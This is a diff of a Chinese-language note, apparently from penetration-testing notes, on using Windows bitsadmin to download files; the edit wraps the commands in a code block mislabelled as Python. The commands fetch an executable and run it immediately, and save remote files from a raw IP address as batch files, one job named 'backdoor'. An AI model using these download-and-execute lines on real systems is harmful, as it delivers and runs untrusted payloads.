@@ -72,27 +72,28 @@ Path:
 
 
 
-`bitsadmin /transfer n http://github.com/3gstudent/test/raw/master/putty.exe c:\a.exe && c:\a.exe`
+```python
+bitsadmin /transfer n http://github.com/3gstudent/test/raw/master/putty.exe c:\a.exe && c:\a.exe
 
-`bitsadmin /create 1 bitsadmin /addfile 1 http://47.92.194.173/test.txt c:\autoruns.bat bitsadmin /RESUME 1 bitsadmin /complete 1`
+bitsadmin /create 1 bitsadmin /addfile 1 http://47.92.194.173/test.txt c:\autoruns.bat bitsadmin /RESUME 1 bitsadmin /complete 1
 
-`bitsadmin /create 1 bitsadmin /addfile 1 http://47.92.194.173/test.txt C:\Program Files (x86)\1.bat bitsadmin /RESUME 1 bitsadmin /complete 1`
-
-
-
-`bitsadmin /rawreturn /transfer getfile http://47.92.194.173/test.txt C:\Program Files\1.bat`
+bitsadmin /create 1 bitsadmin /addfile 1 http://47.92.194.173/test.txt C:\Program Files (x86)\1.bat bitsadmin /RESUME 1 bitsadmin /complete 1
 
 
 
-`bitsadmin /transfer myDownLoadJob /download /priority normal "http://47.92.194.173/test.txt" "C:\Program Files (x86)\1.bat"`
+bitsadmin /rawreturn /transfer getfile http://47.92.194.173/test.txt C:\Program Files\1.bat
+
+
+
+bitsadmin /transfer myDownLoadJob /download /priority normal "http://47.92.194.173/test.txt" "C:\Program Files (x86)\1.bat"
 
 bitsadmin /transfer backdoor http://47.92.194.173/test.txt C:\Program Files\1.bat
 
-`DISPLAY: '任务名' TYPE: DOWNLOAD STATE: TRANSFERRED PRIORITY: NORMAL FILES: 1 / 1 BYTES: 11392 / 11392 (100%) Transfer complete`
+DISPLAY: '任务名' TYPE: DOWNLOAD STATE: TRANSFERRED PRIORITY: NORMAL FILES: 1 / 1 BYTES: 11392 / 11392 (100%) Transfer complete
 
 默认情况下bitsadmin下载速度极慢，下载较大文件需要设置优先级提速，以下是用法示例：
 
-\`#下载filezilla FTP客户端，任务名是333 start bitsadmin /transfer 333 http://dwz.cn/fffftp c:\333.exe #设置任务333为最高优先级 bitsadmin /setpriority 333 foreground`
+\#下载filezilla FTP客户端，任务名是333 start bitsadmin /transfer 333 http://dwz.cn/fffftp c:\333.exe #设置任务333为最高优先级 bitsadmin /setpriority 333 foreground
 
 bitsadmin 可以在网络不稳定的状态下下载文件，出错会自动重试，可靠性应该相当不错。
 bitsadmin 可以跟随URL跳转.
@@ -103,6 +104,7 @@ bitsadmin 权限问题待解决
 bitsadmin已经在win7 win10 win2008 不可用
 
 
+```
 
 
 
